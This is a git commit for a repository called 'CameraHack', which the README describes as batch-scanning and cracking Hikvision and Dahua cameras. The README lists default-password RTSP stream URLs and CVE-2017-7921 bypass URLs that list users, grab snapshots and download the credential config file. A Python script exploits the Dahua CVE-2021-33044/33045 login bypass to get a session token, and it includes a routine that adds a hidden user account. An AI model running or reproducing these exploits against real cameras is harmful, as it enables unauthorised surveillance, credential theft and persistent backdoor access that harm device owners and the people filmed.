c11a9c2b49aa58c40961cc0e02169a4bb0d7fa00
AdminWhaleFall <whalefall9420@outlook.com>
2022-07-13 00:08:46 +0800

    🎉 init: first commit

--- README.md
+++ README.md
@@ -1,2 +1,40 @@
 # CameraHack
 批量扫描破解海康威视、大华等摄像头的常见漏洞。
+
+## 海康威视
+
+### RTSP 弱密码
+
+```shell
+# 主码流
+rtsp://admin:12345@IP:554/h264/ch1/main/av_stream
+rtsp://admin:12345@IP:554/MPEG-4/ch1/main/av_stream
+
+# 子码流
+rtsp://admin:12345@IP/mpeg4/ch1/sub/av_stream
+rtsp://admin:12345@IP/h264/ch1/sub/av_stream
+```
+
+### CVE-2017-7921 漏洞
+
+1. 检索设备列表
+```
+http://IP/Security/users?auth=YWRtaW46MTEK
+```
+
+2. 获取监控快照
+```
+http://IP/onvif-http/snapshot?auth=YWRtaW46MTEK
+```
+
+3. 下载摄像头配置账号密码文件
+```
+http://192.168.1.3/System/configurationFile?auth=YWRtaW46MTEK
+```
+- 浏览器会自动下载一个名为 `configurationFile` 的文件,需要经过解密。  
+  Payload: [https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor](https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor)
+
+- 需要一个工具 `wxMEdit` 打开解密后的配置文件,搜索关键字 `admin`.
+
+## 大华摄像头
+> 漏洞利用 `CVE-2021-33044` & `CVE-2021-33045` , 绕过 web 登录鉴权
---
+++ dahua/bypass.py
@@ -0,0 +1,67 @@
+from typing import Union
+import httpx
+import urllib3
+urllib3.disable_warnings()
+
+
+class Payload(object):
+    def __init__(self, ip) -> None:
+        self.ip = ip
+        self.addr = f"http://{self.ip}"
+        header = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
+                  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin":  self.addr+"/", "Referer":  self.addr+"/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
+
+        self.session = httpx.Client(headers=header, verify=False)
+        self.token = None
+
+    def get_token(self) -> Union[bool, str]:
+        """获取 token"""
+        url = self.addr+"/RPC2_Login"
+        post_json = {"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard",
+                                                                   "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}
+        r = self.session.post(url, json=post_json).json()
+        if 'True' in str(r):
+            self.token = r["session"]
+
+            print(f"[+] {self.ip} 大华摄像头 token 获取成功 {self.token}")
+            self.session.cookies["DWebClientSessionID"] = self.token
+            return self.token
+        else:
+            print(f"[-] 大华摄像头 token 获取失败")
+            return False
+
+    def login(self):
+        """通过获取的 token 进行登录"""
+        print(self.session.cookies)
+        # resp = self.session.get(self.addr)
+        # print(resp.cookies)
+        # print(resp.text)
+
+    def add_user(self):
+        """添加一个用户 cyx/dlgz123"""
+        url = f"{self.addr}/RPC2"
+        json_data = {"method": "Security.addUserPlain", "params": {"salt": "aac39c190f37434e69aac7fbf74cd8554cdf29b11e83ae62854dc27b0a00e404ad2760e09ad7fd61dd41fd11de844484ea8c1ac603d861b4ce37364f10c775811f68fc67e731530acf29c009c1a45b81abf2abe93c47be8ef582ec64c180659e13c2cda9da9b8f86c062b7ca57ff9458c0baff1d67bc2b78678fa94fbc3b1ab71be0705f6201b26b1ba2cae4d4c807f69da6d15d4e44b65ab5e8797a0c694d22a409da2611324a0fc6dc738878b53d33caff8a2b40a13bc2fc4a358edf702d727a3294933448b622437223a244e1df05b07c9f8442e90186ce8a72dc218eb5adf46f0fc9147e6f8995d56e0a7462d88e056193eb114bbd22a23280ff882fb067",
+                                                                   "cipher": "RPAC-256", "content": "LhckUxAKFI7jFyC5LHBmbrzQLYRn31LSqiXB2JGt2RZ2lqX9kvUh8OxuyrXiXDi36Gbcva+P98/4qtfMRcD3t2DTa2wNRPYUKvMsVb4vu75foSBhT/XI3kzoUDIHWwd1uAbSxkHK1Y90sBnRkl2ORSjhPFP12JFgtcKeqVOR+MbZbwb4wiqb0OFX5TqKdqDmcRxBg8L9JU4BML2R+AlMhlBJMVz0J4mfu94Qw9ibVNSSp9sn1IMWpp01G/U7jAsTXhJgvG3T3c5Te7doAx55EBQ4OSS8M1lcDdmQU9/FYV3Cz9ZhJ+nqAqkZOgvVl+SVQ9IMeWh6NBqclBmgDCGPKcPIy6J+QMHCEpmkMEtAa1ULMlbW8uBKZSyPXr+eOIZXQfwEbL4URSowcZmuKwWw2vGb70wSebGzekHSX2YwtWEYHORgD/TtHyYI+QsR2uqIzncgW4HQX5WDN+hlcBx8kXevUrkUELcsg359Q0luavQ="}, "id": 356, "session": self.token}
+        resp = self.session.post(url=url, json=json_data)
+        print(self.session.cookies)
+        print(resp.json())
+
+    def login_test(self):
+        url = f"{self.addr}/RPC2"
+        json_data = {"method": "system.listMethod",
+                     "params": "null", "id": 5, "session": self.token
+                     }
+        resp = self.session.post(url=url, json=json_data)
+        print(self.session.cookies)
+        print(resp.json())
+
+    def main(self):
+        if self.get_token():
+            self.login()
+            # self.add_user()
+            self.login_test()
+
+
+if __name__ == "__main__":
+    camera = Payload("10.4.95.12")
+    camera.main()
